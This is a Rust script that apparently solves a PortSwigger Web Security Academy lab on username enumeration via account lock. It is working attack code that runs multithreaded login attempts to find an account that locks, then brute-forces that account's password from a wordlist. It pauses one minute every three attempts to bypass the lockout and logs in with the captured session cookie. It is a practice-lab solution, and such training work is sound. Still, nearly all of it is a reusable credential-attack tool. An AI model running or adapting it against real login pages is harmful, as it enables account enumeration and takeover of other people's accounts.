/***********************************************************************
*
* Lab: Username enumeration via account lock
*
* Hack Steps: 
*      1. Read usernames and passwords lists
*      2. Try all users multiple times until on account is locked
*      3. Brute force the password of that valid username 
*         (wait 1 minute every 3 password tries to bypass blocking)
*      4. Login with the valid credentials
*
************************************************************************/
use lazy_static::lazy_static;
use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    fs::{self},
    io::{self, Write},
    process,
    sync::{
        atomic::{AtomicBool, AtomicUsize, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a55001a04d2814380b6d06a00a2002d.web-security-academy.net";

lazy_static! {
    static ref VALID_USERNAME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref VALID_USERNAME_IS_FOUND: AtomicBool = AtomicBool::new(false);
    static ref USERNAMES_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Reading usernames list.. ");

    let usernames_list = read_list("../../usernames.txt"); // Make sure the file exist in your root directory or change its path accordingly
    let total_count = usernames_list.iter().count();

    let threads = 8; // You can experiment with the number of threads by adjusting this variable
    let mini_usernames_lists = build_mini_lists_for_threads(&usernames_list, threads);

    println!("{}", "OK".green());
    print!("⦗2⦘ Reading password list.. ");

    let password_list = read_list("../../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly

    println!("{}", "OK".green());
    println!("⦗3⦘ Trying to find a valid username.. ");

    try_to_find_valid_username_in_multiple_threads(&mini_usernames_lists, total_count);

    let valid_user = VALID_USERNAME.lock().unwrap();
    println!("\n🗹 Valid username: {}", valid_user.green());
    println!("⦗4⦘ Brute forcing password.. ");

    let (valid_password, new_session) = brute_force_password(&valid_user, &password_list);

    println!("\n🗹 Valid username: {}", valid_user.green());
    println!("🗹 Valid password: {}", valid_password.green());
    print!("⦗5⦘ Logging in.. ");

    fetch_with_session("/my-account", &new_session);

    println!("{}", "OK".green());
    print_finish_message();
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn read_list(file_path: &str) -> Vec<String> {
    let passwords_big_string = fs::read_to_string(file_path)
        .expect(&format!("Failed to read the file: {}", file_path.red()));
    passwords_big_string.lines().map(|p| p.to_owned()).collect()
}

fn build_mini_lists_for_threads(big_list: &Vec<String>, threads: usize) -> Vec<Vec<String>> {
    let list_per_thread_size = big_list.len() / threads;
    big_list
        .chunks(list_per_thread_size)
        .map(|f| f.to_owned())
        .collect()
}

fn try_to_find_valid_username_in_multiple_threads(
    mini_lists: &Vec<Vec<String>>,
    total_count: usize,
) {
    for try_number in 0..4 {
        println!(
            "\n⦗#⦘ Try number: {} of all users..",
            try_number.to_string().blue(),
        );

        // Use every mini list in a different thread
        mini_lists.par_iter().for_each(|mini_list| {
            for username in mini_list {
                let is_found = VALID_USERNAME_IS_FOUND.fetch_and(true, Ordering::Relaxed);
                if is_found {
                    return; // Exit from the thread if the correct username was found
                } else {
                    let counter = USERNAMES_COUNTER.fetch_add(1, Ordering::Relaxed);
                    print_progress(counter, total_count, &username);

                    let try_to_login = login(&username, "not important");
                    if let Ok(response) = try_to_login {
                        if text_exist_in_response("too many incorrect login attempts", response) {
                            VALID_USERNAME_IS_FOUND.fetch_or(true, Ordering::Relaxed);
                            VALID_USERNAME.lock().unwrap().push_str(username);
                            return;
                        } else {
                            continue;
                        }
                    } else {
                        print_failed_request(&username);
                        continue;
                    }
                }
            }
        });
    }

    let is_found = VALID_USERNAME_IS_FOUND.fetch_and(true, Ordering::Relaxed);
    if is_found {
        return;
    } else {
        println!("{}", "\n⦗!⦘ No valid username was found".red());
        process::exit(1);
    }
}

fn text_exist_in_response(text: &str, response: Response) -> bool {
    let regex = Regex::new(text).unwrap();
    let body = response.text().unwrap();
    if regex.find(&body).is_some() {
        true
    } else {
        false
    }
}

fn brute_force_password(valid_user: &str, password_list: &Vec<String>) -> (String, String) {
    let total_count = password_list.iter().count();

    for (counter, password) in password_list.iter().enumerate() {
        // Wait 1 minute every 2 tries to bypass blocking
        if counter % 3 == 0 {
            wait_one_minute();
        }

        print_progress(counter, total_count, password);

        let try_to_login = login(valid_user, password);

        if let Ok(response) = try_to_login {
            if response.status().as_u16() == 302 {
                let new_session = get_session_cookie(&response);
                return (password.to_owned(), new_session);
            } else {
                continue;
            }
        } else {
            print_failed_request(&password);
            continue;
        }
    }

    println!("{}", "\n⦗!⦘ No valid passwords was found".red());
    process::exit(1);
}

fn wait_one_minute() {
    println!("⦗*⦘ Waiting 1 minute to bypass blocking..");
    thread::sleep(Duration::from_secs(60));
}

fn login(username: &str, password: &str) -> Result<Response, Error> {
    let data = HashMap::from([("username", username), ("password", password)]);
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&data)
        .send()
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "Failed to fetch carlos profile".red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn print_progress(counter: usize, total_count: usize, text: &str) {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    print!(
        "\r❯❯ Elapsed: {:2} minutes || Trying ({}/{total_count}): {:50}",
        elapsed_time.yellow(),
        counter + 1,
        text.blue()
    );
    io::stdout().flush().unwrap();
}

fn print_finish_message() {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    println!("🗹 Finished in: {} minutes", elapsed_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green());
}

fn print_failed_request(text: &str) {
    println!("{} {}", "\n⦗!⦘ Failed to try:".red(), text.red())
}
